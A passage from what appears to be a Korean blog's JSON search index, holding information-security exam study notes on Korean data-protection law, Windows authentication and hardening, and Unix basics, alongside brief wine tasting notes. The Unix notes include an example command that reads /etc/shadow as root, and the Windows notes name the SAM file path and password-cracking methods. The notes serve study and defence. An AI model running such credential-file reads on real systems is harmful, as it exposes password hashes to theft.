보호의무자가 8세 이하의 아동등의 생명 또는 신체의 보호를 위하여 8세 이하의 아동등의 개인위치정보의 수집,이용 또는 제공에 동의하는 경우에는 본인의 동의가 있는 것으로 본다.                    8세 이하의 아동           피성년후견인           &lt;장애인복지법&gt; 제2조 제2항 제2호에 따른 정신적 장애를 가진 사람으로서 &lt;장애인고용촉진 및 직업재활법&gt; 제2조 제2호에 따른 중증장애인에 해당하는 사람(&lt;장애인복지법&gt; 제32조에 따라 장애인 등록을 한 사람만 해당한다)                           3. 신용정보의 이용 및 보호에 관한 법률(시행령)     제16조(기술적,물리적,관리적 보안대책의 수립)            법 제19조 제1항에 따라 신용정보회사등은 신용정보전산시스템의 안전보호를 위하여 다음 각호의 사항이 포함된 기술적,물리적,관리적 보안대책을 세워야 한다.                    신용정보에 제3자가 불법적으로 접근하는 것을 차단하기 위한 침입차단시스템 등 접근 통제장치의 설치,운영에 관한 사항           신용정보전산시스템에 입력된 정보의 변경,훼손 및 파괴를 방지하기 위한 사항           신용정보 취급,조회 권한을 직급별,업무별로 차등 부여하는 데에 관한 사항 및 신용정보 조회기록의 주기적인 점검에 관한 사항           그 밖에 신용정보의 안정성확보를 위하여 필요한 사항                       금융위원회는 제1항 각 호에 따른 사항의 구체적인 내용을 정하여 고시할 수 있다.           제28조(개인신용정보의 제공,활용에 대한 동의)            신용정보제공,이용자는 법 제 32조 제1항에 따라 해당 개인으로부터 동의를 받으려면 다음 각호의 사항을 미리 알려야 한다. 다만, 동의 방식의 특성상 동의 내용을 전부 표시하거나 알리기 어려운 경우에는 해당 기관의 인터넷 홈페이지나 주소나 사업장 전화번호 등 동의 내용을 확인할 수 있는 방법을 안내하고 동의를 받을 수 있다.                    개인신용정보를 제공받는 자           개인신용정보를 제공받는 자의 이용목적           제공하는 개인신용정보의 내용           개인신용정보를 제공받는 자(신용조회회사 및 신용정보집중기관은 제외한다)의 정보 보유 기간 및 이용 기간                       법 제32조 제2항에 따라 신용조회회사 또는 신용정보집중기관으로부터 개인신용정보를 제공받으려는 자는 다음 각호의 사항을 해당 개인에게 알리고 동의를 받아야 한다. 다만, 동의방식의 특성상 동의 내용을 전부 표시하거나 알리기 어려운 경우에는 해당 기관의 인터넷 홈페이지 주소나 사업장 전화번호 등 동의 내용을 확일할 수 있는 방법을 안내하고 동의를 받을 수 있다.                    개인신용정보를 제공하는 자           개인신용정보를 제공받는 자의 이용 목적           제공받는 개인 신용정보의 항목           개인신용정보를 제공받는 것에 대한 동의의 효력기간                           제29조(개인식별정보의 제공,이용)            법 제32조 제1항에서 “대통령령으로 정하는 정보”란 생존하는 개인의 성명, 주소, 주민등록번호, 외국인등록번호, 국내거소신고번호, 여권번호, 성별, 국적 등 개인을 식별할 수 있는 정보를 말한다.           제32조(개인신용정보 제공,이용 동의 철회권 등)            법 제37조 제1항에 따라 개인인 신용정보주체는 동의 철회의 대상 및 내용 등을 특정하여 해당 기관의 인터넷 홈페이지, 유무선 통신, 서면, 그 밖에 금융위원회가 정하여 고시하는 방법으로 동의를 철회할 수 있다. 다만, 금융거래 등 상거래 관계를 설정하면서 동의를 한 경우에는 3개월이 지나야 철회할 수 있다.       법 제37조 제2항에 따라 개인인 신용정보주체는 상품이나 용역을 소개하거나 구매를 권유할 목적으로 연락하는 신용정보제공,이용자에 대하여 연락중지 청구의 대상 및 내용을 특정하여 제1항의 방법으로 본인에게 연락하는 것을 중지할 것을 청구할 수 있다.       제1항 및 제2항에 따른 청구를 받은 신용정보제공,이용자는 청구를 받은 날부터 1개월 이내에 그에 따른 조치를 완료하여야 한다.           제37조의2(민감정보 및 고유식별정보의 처리)            금융위원회(제37조에 따라 금융위원회의 업무를 위탁받은 자를 포함한다), 금융감독원장은 다음 각호의 사무를 수행하기 위하여 불가피한 경우 &lt;개인정보 보호법 시행령&gt; 제 18조 제2호에 따른 범죄경력자료에 해당하는 정보, 같은 영 제19조 제1호, 제2호 또는 제4호에 따른 주민등록번호, 여권번호 또는 외국인등록번호가 포함된 자료를 처리할 수 있다.           4. 전자서명법     공인인증서            공인인증기관이 발급하는 공인인증서에는 다음 각호의 사항이 포함되어야 한다.                    가입자의 이름(법인의 경우에는 명칭을 말한다)           가입자의 전자서병검증정보           가인자와 공인인증기관이 이용하는 전자서명 방식           공인인증서의 일련번호           공인인증서의 유효기간           공인인증기관의 명칭 등 공인인증기관임을 확인할 수 있는 정보           공인인증서의 이용범위 또는 용도를 제한하는 경우 이에 관한 사항           가입자가 제3자를 위한 대리권 등을 갖는 경우 또는 직업상 자격등의 표시를 요청한 경우 이에 관한 사항           공인인증서임을 나타내는 표시                           제18조(공인인증서의 폐지)            공인인증기관은 공인인증서에 관하여 다음 각호의 1에 해당하는 사유가 발생한 경우에는 당해 공인인증서를 폐지하여야한다.                    가입자 또는 그 대리인이 공인인증서의 폐지를 신청한 경우           가입자가 사위 기타 부정한방법으로 공인인증서를 발급받은 사실을 인지한 경우           가입자의 사망,실종선고 또는 해산 사실을 인지한 경우           가입자의 전자서명생성정보가 분실,훼손 또는 도난,유출된 사실을 인지한 경우                       공인인증기관은 제1항의 규정에 의하여 공인인증서를 폐지한 경우에는 그 사실을 항상 확인할 수 있도록 지체 없이 필요한 조치를 취하여아 한다.           제23조(전자서명생성정보의 보호 등)            누구든지 타인의 전자서명생성정보를 도용 또는 누설하여서는 아니 된다.       누구든지 타인의 명의로 공인인증서를 발급받거나 발급받을 수 있도록 하여서는 아니 된다.       누구든지 공인인증서가 아닌 인증서 등을 공인인증서로 혼동하게 하거나 혼동할 우려가 있는 유사한 표시를 사용하거나 허위로 공인인증서의 사용을 표시하여서는 아니 된다.       누구든지 공인인증서를 이용 범위 또는 용도에서 벗어나 부정하게 사용하여서는 아니 된다.       누구든지 행사하게 할 목적으로 다른 사람에게 공인인증서를 양도 또는 대여하거나 행사할 목적으로 다른 사람의 공인인증서를 양도 또는 대여 받아서는 아니 된다.          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","정보보호 관리","정보보호 관련 윤리 및 법규"],
        "url": "https://bluesplatter.com/is_certification/ISCert-05ISM-02IS_Law/",
        "teaser": null
      },{
        "title": "Carlo Sani Susumaniello 카를로 사니 수수마니엘로 (2018)",
        "excerpt":"1. 구매정보     빈티지 : 2018   가격 : 20300 원   구매처 : 롯데마트 서울역   2. 비비노      링크   2. 감상     1일차            붉은 베리향       단 맛이 약간 느껴짐           2일차            무게감이 줄고 산뜻함       향긋하고 깔끔           3. 총점     3.6/5  ","categories": ["Wine"],
        "tags": ["와인"],
        "url": "https://bluesplatter.com/wine/Wine_carlo-sani-susumaniello/",
        "teaser": null
      },{
        "title": "M Chapoutier La Ciboise Costieres De Nimes 엠 샤푸티에 라 시부아즈 꼬스띠에 드 님 (2018)",
        "excerpt":"1. 구매정보     빈티지 : 2018   가격 : 15000 원   구매처 : 이마트 영등포   2. 비비노      링크   2. 감상     1일차            이스트, 포도, 레몬, 붉은과일 향       부드러움, 딸기잼 맛, 미네랄 느낌       가성비 좋고, 입맛에 맞는 와인임           3. 총점     3.8/5  ","categories": ["Wine"],
        "tags": ["와인"],
        "url": "https://bluesplatter.com/wine/Wine_m_chapoutier_la_ciboise_nimes/",
        "teaser": null
      },{
        "title": "Yalumba Y Shyraz 얄룸바 Y 쉬라즈",
        "excerpt":"1. 구매정보     빈티지 :   가격 : 15000 원   구매처 : 롯데마트 서울역   2. 비비노      링크   2. 감상     1일차            괜찮은 산미       약간 단 향       약간 스파이시           3. 총점     3.3/5  ","categories": ["Wine"],
        "tags": ["와인"],
        "url": "https://bluesplatter.com/wine/Wine_yalumba-the-y-series-shiraz/",
        "teaser": null
      },{
        "title": "Marques De Casa Concha Carmenère 마르께스 데 까사 콘차 까르미네르 (2018)",
        "excerpt":"1. 구매정보     빈티지 : 2018   가격 : 28000 원   구매처 : 롯데마트 서울역   2. 비비노      링크   2. 감상     1일차            적갈색       토마토 체리 가죽 검은과일       텁텁하면서 새콤 시큼 부드러움       밸런스 좋음           3. 총점     3.8/5  ","categories": ["Wine"],
        "tags": ["와인"],
        "url": "https://bluesplatter.com/wine/Wine_marques-de-casa-concha-carmenere/",
        "teaser": null
      },{
        "title": "Banfi Chianti Classico 반피 끼안티 클라시코 (2017)",
        "excerpt":"1. 구매정보     빈티지 : 2017   가격 : 29000 원   구매처 : 롯데마트 서울역   2. 비비노      링크   2. 감상     1일차            연한 갈색, 연한 벽돌색       딸기향       시큼, 상큼, 스파이시           3. 총점     3.7/5  ","categories": ["Wine"],
        "tags": ["와인"],
        "url": "https://bluesplatter.com/wine/Wine_banfi-chianti-classico/",
        "teaser": null
      },{
        "title": "Gran Passione Rosso Veneto 그랑 파시오네 로쏘 베네토",
        "excerpt":"1. 구매정보     빈티지 :   가격 : 29000 원   구매처 : 롯데마트 서울역   2. 비비노      링크   2. 감상     1일차            진한 자주색, 벽돌색       체리, 향신료, 빵냄새       풀, 토마토, 텁텁함, 밸런스       달달?           3. 총점     3.9/5  ","categories": ["Wine"],
        "tags": ["와인"],
        "url": "https://bluesplatter.com/wine/Wine_gran-passione-rosso-veneto/",
        "teaser": null
      },{
        "title": "정보보안 - 윈도우 시스템 구조",
        "excerpt":"윈도우 아키텍처     (Ring 구조) - 경량화된 운영체제, Plug In Play   하드웨어 / HAL / 마이크로 커널 / 각종 관리자 / 응용 프로그램    이미지 출처      2중모드            사용자모드                    Application 에 문제생길 경우 프로그램 종료됨           Win32 서브시스템                            (연계)POSIX : 유닉스 OS 공통 API (IEEE 표준)               (연계)OS/2 : IBM PS/2                                   NTVDM (NT Virtual Dos Machine) : 구형 DOS 사용가능                       커널모드                    커널 자체에 문제생길 경우 메모리덤프 후 재시작됨           시스템 서비스           마이크로 커널           HAL           관리자                            입출력 관리자               객체 관리자               보안 참조 관리자               프로세스 관리자               로컬 프로시저 호출(LPC) 관리자               가상 메모리 관리자               기타 관리자               그래픽 장치 관리자                                                                  구성 내용       세부 내용                       HAL (Hardware Abstraction Layer)       드라이버 개발자가 HAL 표준을 준수하면 하드웨어-소프트웨어 간 원할한 통신 가능                 Micro Kernel       관리자 에게 역할을 분담시키고 하드웨어를 제어 %systemRoot%\\sysem32\\ntoskernel.exe                 IO Manager 입출력관리자       시스템 입출력을 제어, 장치 드라이버 사이에서 메시지를 전달, 응용 프로그램이 하드웨어와 통신할 수 있는 통로를 제공                 Object Manager 객체관리자       파일, 포트, 프로세스, 스레드와 같은 각 객체에 대한 정보를 제공                 Security Reference Manager 보안 참조 관리자       데이터 및 시스템 자원의 제어를 허가/거부 함으로써 시스템의 보안설정을 책임짐                 Process Manager 프로세스 관리자       프로세스 및 스레드를 생성하고 요청에 따른 작업 처리                 Local Procedure Call 로컬 프로시저 호출관리자       프로세스는 서로의 메모리 공간을 침범하지 못하기 때문에 프로세스 간에 통신이 필요한 경우 이를 처리하는 장치                 Virtual Memory Manager 가상 메모리 관리자       응용 프로그램의 요청에 따라 RAM 메모리 할당, 가상 메모리의 Paging을 제어                 Win32/64 Sub System       윈도우의 기본 서버 시스템, 32비트 및 64비트 응용 프로그램이 동작할 수 있도록 지원                 POSIX       유닉스 운영체계에 기반을 두고 있는 일련의 표준 운영체계 인터페이스                 Security Sub System       사용자가 로그인할 때 데이터를 보호하고 운영체제가 이를 제어할 수 있도록 만든 서브 시스템           ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","윈도우 시스템 구조"],
        "url": "https://bluesplatter.com/is_certification/IS-Windows-SystemStructure/",
        "teaser": null
      },{
        "title": "정보보안 - 정보보안기사 실기시험에 대해",
        "excerpt":"정보보안기사 실기 배점     단답형 : 3점 * 10 문항 = 30점   서술형 : 14점 * 3 문항 = 42점   실무형 : 14점 * 2 문항 = 28점 (3문항 중 택 2, 안 푸는 문제 X 표시)       부분점수, 감점제 : 정확히 아는 문항을 최대한 작성           출제 기준  1. 정보보안실무  1. 시스템 및 네트워크 보안특성 파악   세부항목     운영체제별 보안 특성 파악   프로토콜별 보안특성 파악   서비스별 보안특성 파악   보안장비 및 네트워크 장비별 보안특성 파악   시스템 항목     윈도우, 유닉스, 리눅스의 기본적 특징   각 운영체제의 취약점   운영체제별 계정관리, 서비스 관리, 로그관리   네트워크 항목     각 프로토콜에 대한 내용   OSI 7 계층        네트워크 관리 명령어       VPN, IPSEC, SSL/TLS   2. 취약점 점검 및 보완   세부항목     운영체제 및 버전별 취약점 점검, 보완   서비스 버전별 취약점 점검, 보완   보안장비 및 네트워크 장비 취약점 점검, 보완   취약점 점검 및 보완 사항 이력 관리   시스템, 네트워크, 애플리케이션 항목     시스템 취약점   네트워크 취약점   애플리케이션 취약점   3. 관제 및 대응   세부항목     관제하기   대응하기   침해사고에 대한 분석 및 대응     각종 보안장비, 침입탐지시스템, 침입차단시스템   시스템 점검도구   4. 정보보호계획 수립   세부항목     IT 현황 및 자산 파악   조직의 요구사항 파악   관련법령 검토   정보보안일반, 정보보안관리및 법규     정보보호의 개념   위험관리   접근통제   정보통신망법   개인정보보호법   정보통신기반보호법   전자서명법   5. 위협분석   세부항목     조직의 내 외부 위협 요인 분석   조직의 H/W, S/W 등 정보 자산 취약점 분석   조직의 정보자산 위협 및 취약점 분석 정리   위험평가   정보보호대책 선정 및 이행 계획 수립   정보보안일반, 정보보안관리및 법규 취약점 점검 및 보완   6. 정보보호대책 구현   세부항목     정보보호 정책 수립 및 운영   관리적 정보보호 대책 구현 및 운영   물리적 정보보호 대책 구현 및 운영   기술적 정보보호 대책 구현 및 운영   정보보안일반, 정보보안관리및 법규   ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","정보보안실기"],
        "url": "https://bluesplatter.com/is_certification/IS-About-PracticalTest/",
        "teaser": null
      },{
        "title": "정보보안 - 윈도우 인증",
        "excerpt":"윈도우 인증    이미지 출처   윈도우 인증 구성 요소      Winlogon : 로그인 프로세스 (ID/PW 입력 윈도우 창)            GINA(msgina.dll) : 계정정보와 암호화 된 패스워드를 LSA에 전달           LSA (Local Security Authority) - 보안 서브시스템 수행 (lsas.exe)            NTLM (윈도우 기본 인증 프로토콜), SAM 포함       모든 계정의 로그인(로컬, 원격 모두 포함)에 대한 검증       시스템 자원 및 파일 등에 대한 접근 권한 검사       계정명과 SID (Security ID) 매칭       SRM이 생성한 감사 로그 기록       전달받은 계정과 비밀번호를 검증하기 위해 NTLM 모듈을 로드하고 이를 통해 SAM에 접근           SAM (Security Account Manager) 수행            사용자/그룹 계정, 암호화된 패스워드 정보(해시값) 에 대한 DB를 관리       SAM 파일 위치는 대게 %SystemRoot%\\System32\\config\\sam 임       사용자 로그인 정보와 SAM 데이터베이스를 비교해서 일치여부를 SRM에 알림           SRM (Security Reference Monitor) 수행            사용자에게 SID를 부여       SID에 기반하여 자원(파일, 디렉터리)에 대한 접근 허용 여부를 결정함           SID : Security ID     사용자 로그인 후 Access token 생성 : SID (보안 식별자) 포함                                   S - 1 - 5 - 21 - xxxxxxxxx - 500           501           1000           …                                 S - 1 : 윈도우시스템       5 - 21 : 도메인컨트롤러 (AD에 대한 데이터베이스 소유) or 단독시스템       xxxxxxxxx : 컴퓨터 고유식별번호 (리부팅 시 변동)                                                       500               501               1000 : 사용자 식별자                                                     500 : 관리자           501 : 게스트           1000 이상 : 일반사용자                           확인법 : WMIC 실행 후 useraccount list brief   로컬인증의 흐름     로그인 프로세스 시작   Winlogon 에 ID / PW 입력   GINA 를 통해 계정정보와 암호화 된 패스워드를 LSA에 전달   LSA 는 NTLM 을 통해 SAM과 대조하여 계정을 검증   Access Token을 생성, 전달   로그인 프로세스 종료, 새로운 프로세스를 시작   원격인증 (Domain 인증) 의 흐름     로그인 프로세스 시작   Winlogon 에 ID / PW 입력   GINA 를 통해 계정정보와 암호화 된 패스워드를 LSA에 전달   LSA 는 도메인  인증인지 판단 후 도메인컨트롤러에 커버로스 프로토콜로 인증 시도   도메인컨트롤러 의 LSA (커버로스, Active Directory) 를 통해 인증   Access Token을 생성, 전달   로그인 프로세스 종료, 새로운 프로세스를 시작   SAM 취약점     SAM 은 사용자, 그룹 계정의 패스워드, SID 관리하는 중요파일 -&gt; 접근통제 필요   %SystemRoot%\\System32\\config\\sam -&gt; 속성 -&gt; 보안 탭            그룹 또는 사용자 이름 : Everyone, System, Administrator       Everyone 을 제거해야 함.           윈도우 인증 개요     ID, PW 인증방식은 PW 노출 및 패스워드 재사용 공격에 취약   윈도우는 Challenge &amp; Response 방식의 인증 구조를 사용            인증 요청 : 클라이언트가 서버에 인증 요청       Challenge 값 생성 / 전송 : 서버는 Challenge 값을 생성, 클라이언트에 전달       Response 값 생성 / 전송 : 전달받은 Challenge 값과 패스워드를 이용, Response 전송       Response 값 확인 및 인증성공           인증 암호 알고리즘     LM (Lan Manager) 해시 : 윈도우 2000, XP 기본 알고리즘, 취약   NTLM 해시 : LM 해시에 MD4 해시(취약) 가 추가, 취약   NTLMv2 해시 : Vista 이후 기본 인증 프로토콜.   Lan Manager            네트워크를 통한 파일/프린터 공유 작업시 인증을 담당하는 서비스       인증 수준 설정을 통해 네트워크 로그온에 사용할 Challenge/Response 인증 프로토콜을 결정하면 클라이언트가 사용하는 인증 프로토콜 수준, 협상된 세션 보안 수준, 서버가 사용하는 인증 수준에 영향을 줌. -&gt; NTLMv2 사용을 권장           로컬 보안 정책 -&gt; 로컬 정책 -&gt; 보안 옵션 -&gt; 네트워크 보안: LAN Manager 인증 수준   패스워드 크래킹     사전공격 (Dictionary Attack)   무차별/무작위 대입공격 (Brute Force Attack)   혼합공격 (Hybrid Attack) : 사전공격 + 무차별 공격 (문구 + 숫자나 특문)   레인보우 테이블 (Rainbow Table) 을 이용한 공격            해시 테이블과 R(Reduction) 함수를 이용          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","윈도우 보안","윈도우 인증 구성"],
        "url": "https://bluesplatter.com/is_certification/IS-Windows-Authentication/",
        "teaser": null
      },{
        "title": "정보보안 - 윈도우 서버 보안",
        "excerpt":"계정관리   윈도우 계정 관리     계정 : 시스템에 접근하는 것이 허가된 사용자인지를 검증하기 위한 정보   계정의 수를 줄여야 함 (불필요한 계정 삭제)            불필요한 계정 제거       장기 미사용 계정 : 잠금설정       의심가는 계정 제거       제어판 -&gt; 관리도구 -&gt; 컴퓨터 관리 -&gt; 시스템도구 -&gt; 로컬 사용자 및 그룹 -&gt; 사용자           관리자의 ID (기본생성값, Administrator) 를 변경해야 함   관리자 그룹에 최소한의 계정만을 포함시킴            제어판 -&gt; 관리도구 -&gt; 컴퓨터 관리 -&gt; 시스템도구 -&gt; 로컬 사용자 및 그룹 -&gt; 그룹           윈도우 서버의 관리자 계정은 로그인 실패횟수에 대한 제한이 없음            무작위 공격의 대상           Administrator ID 변경     제어판 -&gt; 관리도구 -&gt; 로컬보안정책 -&gt; 로컬정책 -&gt; 보안옵션 -&gt; 계정: Administrator 계정 이름 바꾸기   Guest 계정     불특정한 사용자가 시스템에 접근할 수 있음. -&gt; 사용 제한   다수의 접근이 필요한 경우 일반계정을 생성하여 접근하도록 유도   제어판 -&gt; 관리도구 -&gt; 컴퓨터 관리 -&gt; 시스템도구 -&gt; 로컬 사용자 및 그룹 -&gt; 사용자 -&gt; Guest -&gt; 속성 -&gt; 계정 사용 안 함   암호관리   암호 관리     외부에서 쉽게 PW를 습득(Crack) 하여 침입하는 경우를 차단   비밀번호 복잡성 설정            최근 사용 암호 기억 설정 (12개 이상 설정 권장)       최소 암호 사용 기간 (패스워드 변경에 대한 시간적 제약 - 기존 사용 PW 사용불가)       최대 암호 사용 기간 (90일 이하)       복잡성 만족 (대문자, 소문자, 숫자, 특수문자)                    2가지 조합 : 최소 10자리 이상           3가지 조합 : 최소 8자리 이상                       제어판 -&gt; 관리도구 -&gt; 로컬보안정책 -&gt; 계정 정책 -&gt; 암호 정책           계정 잠금 임계값 설정            무차별 대입 공격에 대한 대책       계정 잠금 기간(분)       계정 잠금 임계값       다음 시간 후 계정 잠금 수를 원래대로 설정       제어판 -&gt; 관리도구 -&gt; 로컬보안정책 -&gt; 계정 정책 -&gt; 계정 잠금 정책           서비스관리   하드 디스크 기본 공유 제거     불필요한 공유 제거 필요   C$, D$            C, D 드라이브에 대한 관리목적 공유폴더       네트워크 상의 드라이브 관리가 필요없으면 제거           IPC$ (Inter Process Communication)            프로세스간 통신을 위한 통로       널 세션이라고도 함 (ID/PW 없이 세션 연결)                    방화벽, 라우터, 네트워크 고급설정, 레지스트리 등으로 차단                       네트워크 프로그램 간 통신에서 클라이언트와 서버 사이를 임시로 연결하는 데 사용       네트워크 서버의 원격 관리에 주로 사용           ADMIN$ : 윈도우 설치 폴더에 접근하는 관리목적 공유 폴더   net share : 공유폴더 목록 확인   net share &lt;폴더 이름&gt; /delete : 공유 폴더 삭제   위 명령어로 제거하여도 재부팅 시 기본공유 재 생성됨 -&gt; 레지스트리 키 제거 필요            regedit       HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\\AutoShareServer       DWORD 값을 0 으로 설정           공유 권한 및 사용자 그룹 설정     디폴트 공유(C$,D$,Admin$,IPC$) 제외한 공유 폴더가 Everyone 그룹 (익명사용자) 으로 공유가 금지되었는지를 점검   제어판 -&gt; 관리도구 -&gt; 컴퓨터 관리 -&gt; 시스템 도구 -&gt; 공유 폴더 -&gt; 공유 -&gt; 공유 사용권한 확인   불필요한 서비스 제거     Alerter : 서버에서 클라이언트에 경고메시지를 보내는 서비스 (경고메시지 악의사용)   Clipbook : 서버 내의 Clipbook을 다른 클라이언트에 공유 (정보노출)   Messenger : Netsend 명령어로 클라이언트에 메시지 전송   Simple TCP/IP Services : Echo, Daytime 등의 단순한 명령어 전송   제어판 -&gt; 관리도구 -&gt; 서비스 -&gt; 속성 -&gt; 시작 유형 - 사용안함            수동 : 타 서비스에서 해당 기능이 필요할 때 실행       자동 : 부팅 후 운영체제에 의해 자동 로딩됨       사용안함 : 실행하지 않음           Anonymous FTP 금지     익명 연결 허용 부분 해제   특정 IP 주소만 허용  ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","윈도우 서버 보안"],
        "url": "https://bluesplatter.com/is_certification/IS-Windows-Server_Security/",
        "teaser": null
      },{
        "title": "정보보안 - 유닉스 계열의 발전",
        "excerpt":"유닉스 발전      이미지 출처   유닉스는 크게 두 계통으로 나뉨     시스템5 : 상업용   BSD : 연구개발용   유닉스의 발전     유닉스 : AT&amp;T, 벨 연구소   버전 3 : 데니스리치 (C언어)   버전 6 : 외부 공개   1.x BSD : 버클리 대학에서 네트워크 기능을 추가   버전 7 : 본쉘 등장, 유닉스의 원조   SunOS 1.x : Sun 사에서 BSD 를 토대로 개발   시스템3 : AT&amp;T 사에서 개발   SunOS 2.x : BSD + 시스템5   유닉스 종류     IBM AIX (시스템5)   HP-UX (시스템5)   Solaris (시스템5)   SunOS (BSD)   FreeBSD (BSD)   리눅스  ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","UNIX"],
        "url": "https://bluesplatter.com/is_certification/IS-Unix-base/",
        "teaser": null
      },{
        "title": "정보보안 - 유닉스 시스템 접속",
        "excerpt":"시스템 접속   시스템 접속하기     telnet, ssh 등으로 접속   로그인 프로그램 으로 로그인 (ID/PW)            /etc/passwd 와 비교           환경변수 값 참조            HOME : 홈 디렉토리       SHELL : 실행 쉘 경로       USER : 로그인 계정       LOGNAME : 로그인 계정           사용자 기본 명령어  쉘의 종류 확인     echo $SHELL   암호 변경     passwd   사용자 정보     /etc/passwd   해시로 암호화된 패스워드   /etc/shadow -&gt; /etc/passwd : pwunconv   root: x: 0: 0: root: /root: /bin/bash            Login Name       Password : x -&gt; /etc/shadow       User ID : root = 0       User Group ID : root = 0       Comments       Home Directory       Shell : 만약 /bin/false 이면 셸을 실행하지 않음.           uid, gid, Shell 부분의 주기적 확인이 필요   사용자 확인     id : uid, gid 확인   id [사용자명] : 사용자명에 대한 uid, gid 확인   사용자 전환     su [-] [user_account] [-c command]            -c : 쉘을 실행하지 않고 주어진 명령만을 수행       -s : 지정된 쉘로 로그인       -, -i : 지정한 사용자의 환경변수를 적용하여 로그인           $su ab -&gt; 사용자 전환 (비밀번호 입력)   $su - ab -&gt; 사용자 전환 + login shell (환경변수설정) (비밀번호 입력)   #su ab -&gt; 사용자 전환 (비밀번호 입력 불필요)   $su -c 'cat /etc/shadow' - root: root 권한으로 명령어 실행   $su -s /bin/csh - root : c쉘로 root 권한 획득   그룹정보     그룹명과 그룹 ID            사용자는 하나 이상의 그룹에 소속될 수 있음           기본 그룹과 보조 그룹            /etc/passwd 파일의 네 번째 필드는 사용자가 소속된 기본 그룹(GID)       /etc/group : 보조 그룹           /etc/group 파일            group_name : unavailable : group_ID : user_account_entry_in_group       그룹명 : 패스워드(사용 X) : 그룹 ID : 그룹을 보조그룹으로 사용하는 사용자계정           쉘(SHELL)     사용자는 커널에 직접 명령을 내리기 어려움   운영체제의 일부인 쉘이 사용자로부터 명령을 입력받아 그것을 해석하고 실행   사용자가 운영체제를 사용할 수 있도록 환경을 만들어 줌   쉘의 기능     입출력 재지정            표준입력, 표준출력, 표준에러를 사용하지 않고 다른 경로인 파일로 재지정                    키보드 입력 대신 파일로 입력을 받음           모니터 출력 대신 파일로 출력결과를 받음                       ls -l &gt; ls.txt : ls -l 명령의 결과를 ls.txt 파일로 출력 저장       who &gt;&gt; a.txt : 결과를 해당 파일에 append 시킴           파이프            둘 이상의 결과를 함께 묶어 출력 결과를 다른 프로그램의 입력으로 전환       ps -ef | grep telnet : ps -ef 명령의 결과를 grep 명령의 입력으로 전달       ls -l | more           특수문자 (Meta Character)            ~ : 홈 디렉터리       # : 주석       $ : 쉘 변수       &amp; : 백그라운드작업       * : 문자열와일드카드       ? : 문자열와일드카드(1문자)       ; : 쉘명령 구분자       | : 파이프       &lt;&gt; : 입출력재지정       '' : 특수문자로서의 사전정의를 제거, 단순 문자로 취급       \\ : 바로 다음 문자의 사전적 정의를 제거       \\`` : 문자열을 명령어로 인식하게 해줌           환경변수 (명령)            printenv : 설정된 환경변수들을 모두 확인       printenv 변수명 : 주어진 환경변수 확인       echo $변수명 : 주어진 환경변수 확인       # export PATH=/bin/local;$PATH : 환경변수값 설정 / 변경           환경변수 (목록)            TERM : 터미널의 종류       HOME : 홈디렉토리 지정       SHELL : 쉘의 종류       PATH : 파일 검색 경로 설정       USER, LOGNAME : 사용자 계정       HOSTNAME : 호스트이름       MAIL : 메일이 저장된 파일 경로       MANPATH : 온라인 메뉴얼 경로       TZ : 타임 존 설정       LD_LIBRARY_PATH : 라이브러리 경로       LANG : 언어 지정           설정파일 위치            대부분 Home 디렉터리에 있음       . : 숨김 파일       rc : Resource Configuration       새로운 사용자 등록 시 /etc/skel 아래의 설정파일을 홈 디렉터리에 복사함       .bashrc : 서브쉘, 쉘이 실행될 때마다 실행되는 쉘       .bash_profile : 로그인할 때마다 읽는 설정파일       .bash_logout : 로그아웃할 때 읽는 설정파일           #유닉스 파일시스템     파일시스템은 Partition(물리적) 내의 File system(논리적 구조) 으로 이루어짐.            Boot Block : 운영체제 부팅, 부트스트랩 코드       Super Block : 전체 파일시스템 관리를 위한 정보       i-node List : 각각의 i-node를 표 형태로 보유       Data Block : 실제 파일내용           i-node List            i-node 를 가지고 있는 표           i-node (index-node)            각 파일/디렉터리에 대한 정보를 기억하는 120byte 고정 크기 구조체       i-node number       파일타입       접근권한       링크카운트       소유자 / 소유그룹       파일크기       MAC Time                    last Modification Time : 파일의 내용 최종수정시간           last Access Time : 최종접근시간           last Change Time : 파일의 속성 (i-node) 최종수정시간           stat [파일명] : MAC Time 확인                                Block index (인덱스 필드)               인덱스 필드 : Data Block 에 저장되어 있는 파일의 위치정보       파일/디렉터리 생성 시 i-node 생성, i-node List에 등록           #파일링크     심볼릭링크            다른 파일로의 경로를 가리키는 파일       심볼릭 링크 파일이 삭제되어도 실제원본 파일에는 영향을 미치지 않음       서로 다른 파일 시스템 내에서도 링크가 가능       ln -s [원본파일] [심볼릭 링크 파일]       i-node number 를 이용하지 않고 파일 경로를 기반           하드링크            원본과 하드링크된 파일이 모두 수정되어 항상 같은 파일의 내용을 유지       동일한 i-node number를 갖는 파일을 생성하는 것       ln [원본파일] [하드 링크 파일]       하드링크는 i-node의 link-count 를 증가시킴                    link-count 가 0이 되면 해당 파일의 데이터가 삭제           stat -&gt; links : 0 -&gt; 삭제                           비교            하드링크                    original file -&gt; i-node -&gt; original data           hardlink file -&gt; i-node -&gt; original data                       심볼릭링크                    symboliclink file -&gt; i-node2 -&gt; original file pointer (경로기반) -&gt; original file -&gt; i-node -&gt; original data           ls 명령어 확인 시 : sl-aaa.dat -&gt; aaa.dat                           i-node 값 확인            stat aaa.dat       ls -i aaa.dat           디렉토리 관리     파일 종류            일반 파일 / 정규 파일                    데이터 또는 프로그램 코드에 해당하는 바이트 스트림           표준 파일 입출력 시스템 호출을 통해 참조                       디렉터리 파일                    특별한 형식으로 디스크에 저장           i-node number 를 보유           디렉터리의 명시적인 시스템 호출을 통해 참조 (ls 등)                       특수 파일                    프린터, 터미널, 디스크와 같은 주변장치           파이프, 소캣 같은 프로세스 간 상호 통신 기법           표준 입출력 시스템 호출을 통해 참조                           ls            디렉터리는 i-node number 정보를 가지고 있음       i-node number를 통해 구조체 정보 참조       -l : 목록 형태로 정보를 자세히 출력       -a : 도트파일(숨김파일) 을 포함한 모든 파일 출력       -R : 하위 디렉터리 내용까지 보여줌       -F : 디렉터리인지 어떤 파일인지 알려줌       -i : i-node number를 출력       -s : 크기순 정렬       -t : 수정 시간 순 정렬       -r : 출력 결과 역순 정렬           파일유형            ?rwxrwxrwx 의 ? 에 들어갈 값       d : 디렉터리       b : block 장치파일 - 하드디스크, CD-ROM 등 블록으로 Random Access       c : 문자 장치파일 - 터미널, 